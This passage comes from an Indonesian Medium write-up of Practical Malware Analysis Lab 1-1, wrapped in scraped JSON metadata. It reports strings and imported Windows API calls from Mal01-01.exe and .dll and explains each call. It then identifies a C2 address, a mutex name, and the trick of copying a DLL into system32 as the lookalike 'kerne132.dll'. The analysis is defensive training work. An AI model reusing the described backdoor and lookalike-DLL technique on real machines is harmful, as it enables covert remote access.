<em .exe </em :</p <pre strings Mal01 01.exe<br ...<br kerne132.dll<br kernel32.dll<br .exe<br C:\\ <br C:\\windows\\system32\\kerne132.dll<br Kernel32.<br Mal01 01.dll<br C:\\Windows\\System32\\Kernel32.dll<br WARNING THIS WILL DESTROY YOUR MACHINE</pre <p File ini tampaknya melakukan beberapa operasi dengan file bernama <em Mal01–01.dll </em dan Juga melakukan sesuatu dengan kernel32.dll bawaan library windows, ada indikasi bahwa file tersebut di modifikasi, karena kita dapat melihat file lain yang disebut kerne132.dll, dengan huruf L berubah untuk menjadi angka ‘1’.</p <ul <li <strong Mal01–01.dll</strong </li </ul <p Sedangkan untuk file ini melakukan beberapa operasi jaringan dan proses, seperti membuat mutex atau proses baru, berdasarkan fungsi yang diimpor.</p <pre ======================<br KERNEL32.dll<br ======================<br Sleep<br CreateProcessA<br CreateMutexA<br OpenMutexA<br CloseHandle<br <br ======================<br WS2 32.dll<br ======================<br socket<br WSAStartup<br inet addr<br connect<br send<br shutdown<br recv<br closesocket<br WSACleanup<br htons</pre <p Berikut adalah deskripsi singkat dari pemanggilan fungsi API yang terdapat pada file <em Mal01–01.dll</em :</p <ol <li Sleep: Fungsi ini menghentikan eksekusi program untuk jangka waktu tertentu. Biasanya digunakan untuk menambahkan penundaan dalam eksekusi, yang dapat digunakan dalam teknik penghindaran analisis atau untuk mengatur jangka waktu tertentu dalam eksploitasi.</li <li CreateProcessA: Fungsi ini digunakan untuk membuat proses baru. Itu dapat digunakan untuk menjalankan berkas atau aplikasi lain dengan parameter yang ditentukan. Dalam konteks malware, dapat digunakan untuk menjalankan komponen berbahaya atau eksekusi tambahan.</li <li CreateMutexA: Fungsi ini digunakan untuk membuat objek mutex (synchronizing primitive) dengan nama yang ditentukan. Dalam pengaturan malware, dapat digunakan untuk menghindari eksekusi ganda atau untuk mengidentifikasi apakah malware sudah berjalan sebelumnya.</li <li OpenMutexA: Fungsi ini digunakan untuk membuka objek mutex yang sudah ada dengan nama yang ditentukan. Digunakan untuk memeriksa apakah mutex sudah ada dan apakah malware telah berjalan sebelumnya.</li <li CloseHandle: Fungsi ini digunakan untuk menutup handle objek yang dibuka sebelumnya, seperti handle proses atau handle berkas. Menghindari kebocoran sumber daya.</li <li socket: Fungsi ini digunakan untuk membuat soket yang dapat digunakan untuk komunikasi jaringan. Ini adalah langkah awal dalam membangun koneksi jaringan.</li <li WSAStartup: Fungsi ini menginisialisasi pustaka Winsock yang diperlukan untuk berkomunikasi melalui soket dalam lingkungan Windows.</li <li inet addr: Fungsi ini digunakan untuk mengonversi alamat IP dalam format string menjadi bentuk yang dapat dikenali oleh komputer.</li <li connect: Fungsi ini digunakan untuk menghubungkan soket dengan alamat IP dan nomor port tertentu untuk membentuk koneksi jaringan.</li <li send: Fungsi ini digunakan untuk mengirim data melalui soket yang sudah terhubung.</li <li shutdown: Fungsi ini digunakan untuk mengakhiri koneksi jaringan yang sudah terhubung.</li <li recv: Fungsi ini digunakan untuk menerima data melalui soket yang sudah terhubung.</li <li closesocket: Fungsi ini digunakan untuk menutup soket yang sudah tidak digunakan lagi.</li <li WSACleanup: Fungsi ini membersihkan inisialisasi pustaka Winsock setelah selesai digunakan.</li <li htons: Fungsi ini digunakan untuk mengonversi nomor port dalam format host menjadi format jaringan.</li </ol <p Pemanggilan fungsi API ini mencerminkan interaksi malware dengan sistem operasi dan jaringan. Dalam konteks analisis malware, pemahaman tentang fungsi fungsi ini membantu dalam mengidentifikasi perilaku dan tujuan yang mungkin terkait dengan aktivitas berbahaya.</p <p Berikut hasil Strings Capture dari file <em .dll</em </p <pre strings Mal01 01.dll<br ...<br hello<br 127.26.152.13<br SADFHUHF<br ...</pre <p Kita dapat melihat terdapat alamat IP yang menandakan bahwa alamat IP tersebut merupakan alamat C&amp;C. Dan juga terdapat string <em SADFHUHF</em bisa menjadi nama mutex yang dibuat oleh malware.</p <p <strong Kesimpulan</strong </p <p Berdasarkan hasil analisa di atas, bahwa eksekusi digunakan untuk menjalankan DLL yang berperan sebagai <em Backdoor </em atau Remote Access Trojan(RAT). Dilihat dari impor yang dilakukan, saat file <em .exe </em dijalankan akan mencari file C:\\windows\\system32\\kerne132.dll, dan jika tidak ditemukan, kemungkinan akan mencoba menyalin DLL berbahaya ke lokasi C:\\windows\\system32\\kerne132.dll. Setelah menjalankan DLL tersebut, terlihat bahwa ada komunikasi dengan server C2 di alamat IP 127.26.152.13.</p <ul <li Mal01–01.exe : file ini menyalin file <em Mal01–01.dll</em ke <em C:\\windows\\system32\\</em dengan nama <em kerne132.dll</em (mengubah <em L</em menjadi <em 1</em ).</li <li Mal01–01.dll: file ini menjalankan beberapa proses dan melakukan beberapa permintaan jaringan ke alamat IP <em 127.26.152.13</em .</li </ul <img src=\"https://medium.com/ /stat?event=post.clientViewed&amp;referrerSource=full rss&amp;postId=9ec2a10802a7\" width=\"1\" height=\"1\" alt=\"\"",
    "tags": [
      "malware-analysis",
      "cybersecurity"
    ],
    "category": "Medium Article",
    "type": "medium",
    "url": "https://angganvryn.medium.com/practical-malware-analysis-lab-1-1-9ec2a10802a7?source=rss-e8b9da247cdf------2",
    "publishedDate": "2023-08-20 23:51:59",
    "updatedAt": "2023-08-20 23:51:59",
    "readingTime": 7,
    "cover": null
  }
]